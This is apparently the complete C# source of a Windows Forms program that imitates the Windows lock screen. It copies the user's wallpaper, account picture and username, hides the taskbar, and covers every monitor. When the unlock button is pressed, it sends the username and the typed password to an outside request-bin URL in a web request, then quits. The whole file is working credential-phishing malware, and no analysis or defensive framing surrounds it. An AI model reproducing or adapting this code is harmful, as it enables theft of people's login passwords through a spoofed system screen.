using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net;

namespace WindowsFormsApp9
{
    public partial class Form1 : Form
    {

        private Image UserPicture;

        public Form1()
        {
            Microsoft.Win32.RegistryKey AccountPictureReg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\AccountPicture", true);
            string AccountPictureFilename = AccountPictureReg.GetValue("SourceId").ToString();
            AccountPictureReg.Close();

            string AccountPicture = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\AccountPictures\\" + AccountPictureFilename + ".accountpicture-ms");
            Console.WriteLine(AccountPicture);
            UserPicture = accountpicture_ms.AccountPicConverter.GetImage448(AccountPicture);

            InitializeComponent();
            Taskbar.Hide();
            FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Image myimage = new Bitmap(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
            BackgroundImage = myimage;
            BackgroundImageLayout = ImageLayout.Stretch;
            this.TopMost = true;
            string userName = System.Environment.UserName.ToString();
            label2.Text = userName;
            label2.BackColor = System.Drawing.Color.Transparent;
            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;
            int bottomname = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 95;
            textBox2.Top = usernameloch;
            pictureBox1.Top = usericonh;
            button1.Top = buttonh;
            label2.Top = usernameh;
            label1.Top = locked;
            textBox2.UseSystemPasswordChar = true;


            foreach (var screen in Screen.AllScreens)
            {

                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }


        }
        private void Form1_Load(object sender, EventArgs e)
        {
            pictureBox1.Image = (Image)UserPicture;
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            gp.AddEllipse(0, 0, pictureBox1.Width - 3, pictureBox1.Height - 3);
            Region rg = new Region(gp);
            pictureBox1.Region = rg;
        }

        public class Taskbar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            [DllImport("user32.dll")]
            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

            [DllImport("user32.dll")]
            private static extern int GetDesktopWindow();

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            protected static int Handle
            {
                get
                {
                    return FindWindow("Shell_TrayWnd", "");
                }
            }

            protected static int HandleOfStartButton
            {
                get
                {
                    int handleOfDesktop = GetDesktopWindow();
                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                    return handleOfStartButton;
                }
            }

            private Taskbar()
            {
                // hide ctor
            }

            public static void Show()
            {
                ShowWindow(Handle, SW_SHOW);
                ShowWindow(HandleOfStartButton, SW_SHOW);
            }

            public static void Hide()
            {
                ShowWindow(Handle, SW_HIDE);
                ShowWindow(HandleOfStartButton, SW_HIDE);
            }
        }

        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == true)
                {


                }

                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch (Exception)
            {
                // log errors
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }


        private void label2_Click(object sender, EventArgs e)
        {

        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            Taskbar.Show();
            base.OnClosing(e);
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            //Console.WriteLine(textBox2);
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            var th = new Thread(postData);
            th.Start();

            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        private void postData()
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("https://ensud9bc6vko.x.pipedream.net?username=" + System.Environment.UserName.ToString() + "&pass=" + textBox2.Text);
            req.GetResponse();
        }
    }


}
